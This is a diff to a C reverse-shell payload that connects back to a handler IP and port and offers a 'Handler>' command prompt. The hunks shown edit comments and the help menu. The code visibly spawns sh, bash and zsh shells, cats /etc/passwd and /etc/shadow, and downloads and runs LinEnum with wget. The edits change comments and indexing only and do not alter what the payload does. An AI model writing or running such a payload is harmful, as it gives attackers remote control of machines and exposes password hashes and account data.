@@ -51,7 +51,7 @@ int main(int argc, char *argv[])
 	{
 		sa.sin_addr.s_addr = inet_addr(argv[1]);	//convert our command line argument ip type and set for sockaddr
 		int port = atoi(argv[2]);					//convert command line string to int
-	    sa.sin_port = htons(port);					//turns command line argument to port
+	    sa.sin_port = htons(port);					//turns command line argument to port ()
 	}
 	else if(argc > 3)
 	{
@@ -59,18 +59,16 @@ int main(int argc, char *argv[])
 		return -1;
 	}
 
-
 	char buff[8192];
 	char command[2048];
 
-    int sock;
+    int sock;	//this will be the socket fd for our connection
 
 	sock = socket(AF_INET, SOCK_STREAM, 0);	//sets up our socket descripter
 
 	//printf("Socket descripter value: %d\n", sock); //this is some file descriptor testing
 
 	int check = connect(sock, (struct sockaddr *)&sa, sizeof(sa));	//attempt to connect
-
 
 	if(check == -1)	//quit on failed connect (value of -1)
 		printf("Failed to connect to socket, exiting\n");
@@ -90,24 +88,26 @@ int main(int argc, char *argv[])
 
 		//THE FOLLOWING WILL BE THE ALLOCATION AND WRITE TO HELP MENU FOR THE MAIN PAYLOAD
 		char help[32][1024];
-		strcpy(help[0],	 "\n----------HELP MENU----------\n\n");
-		strcpy(help[1],	 "ls - Print contents of directory\n");
-		strcpy(help[2],	 "pwd -	print working directory\n");
-		strcpy(help[3],	 "shell - drop into sh shell\n");
-		strcpy(help[4],  "shell2 - drop into bash shell\n");
-		strcpy(help[5],  "ushell - drop int full bash kind of\n");
-		strcpy(help[6],	 "zshell - drop into zsh shell kind of\n");
-		strcpy(help[7],  "pid - print the working process id\n");
-		strcpy(help[8],  "date - get the system datetime\n");
-		strcpy(help[9],  "who - print the current users and their ip address\n");
-		strcpy(help[10],  "whoami - print the current username\n");
-		strcpy(help[11], "passwd - print the passwd file to screen\n");
-		strcpy(help[12], "shadow - attempt to print the shadow password to the screen\n");
-		strcpy(help[13], "gitenum - wget LinEnum and execute\n");
-		strcpy(help[14], "netcat - setup payload to use netcat listening functionality\n");
-		strcpy(help[15], "clear - clear the current screen\n");
-		strcpy(help[16], "exit - quit from payload\n");
-		strcpy(help[17], "\n------------------------------\n\n");
+		int i = 0;	//this will be used to assist in my indexing because I am lazy
+
+		strcpy(help[i++], "\n----------HELP MENU----------\n\n");
+		strcpy(help[i++], "ls - Print contents of directory\n");
+		strcpy(help[i++], "pwd -	print working directory\n");
+		strcpy(help[i++], "shell - drop into sh shell\n");
+		strcpy(help[i++], "shell2 - drop into bash shell\n");
+		strcpy(help[i++], "ushell - drop int full bash kind of\n");
+		strcpy(help[i++], "zshell - drop into zsh shell kind of\n");
+		strcpy(help[i++], "pid - print the working process id\n");
+		strcpy(help[i++], "date - get the system datetime\n");
+		strcpy(help[i++], "who - print the current users and their ip address\n");
+		strcpy(help[i++], "whoami - print the current username\n");
+		strcpy(help[i++], "passwd - print the passwd file to screen\n");
+		strcpy(help[i++], "shadow - attempt to print the shadow password to the screen\n");
+		strcpy(help[i++], "gitenum - wget LinEnum and execute\n");
+		strcpy(help[i++], "netcat - setup payload to use netcat listening functionality\n");
+		strcpy(help[i++], "clear - clear the current screen\n");
+		strcpy(help[i++], "exit - quit from payload\n");
+		strcpy(help[i++], "\n------------------------------\n\n");
 		//HELP MENU INFO OVER HERE
 
 		char *line	= "Handler> ";
@@ -120,8 +120,9 @@ int main(int argc, char *argv[])
 		while(check)
 		{
 
-			if(netcat)
+			if(netcat)	//if a netcat listener is being used, since the line handle is controlled by the handler
 				write(sock, line, strlen(line));
+
 			for(int i = 0; i < 2048; i++)
 				command[i] = 0;	//reset command to nulls so that no past command is left over
 
@@ -153,7 +154,7 @@ int main(int argc, char *argv[])
 			}
 
 			else if(!strcmp("help", command))
-				for(int i = 0; i < 18; i++)
+				for(i = 0; i < 18; i++)
 					write(sock, help[i], strlen(help[i]));	//write help menu
 
 			else if(!strcmp("ls", command))
@@ -179,10 +180,10 @@ int main(int argc, char *argv[])
 				system("whoami");	//display the current running username
 
 			else if(!strcmp("passwd", command))
-				system("cat /etc/passwd");
+				system("cat /etc/passwd");	//open and write passwd file contents
 
 			else if(!strcmp("shadow", command))
-				system("cat /etc/shadow");
+				system("cat /etc/shadow");	//open and write shadow file contents (one way to prove root perms)
 
 			else if(!strcmp("gitenum", command))
 			{
@@ -194,9 +195,9 @@ int main(int argc, char *argv[])
 				system("clear");
 
 			else if(!strcmp("netcat", command)) //sets up payload for NetCat Functionality
-				netcat = 1;
+				netcat = !netcat;
 
-			else if(!strcmp("", command))		//do nothing on empty command
+			else if(!strcmp("", command))	//do nothing on empty command
 				continue;
 
 			else
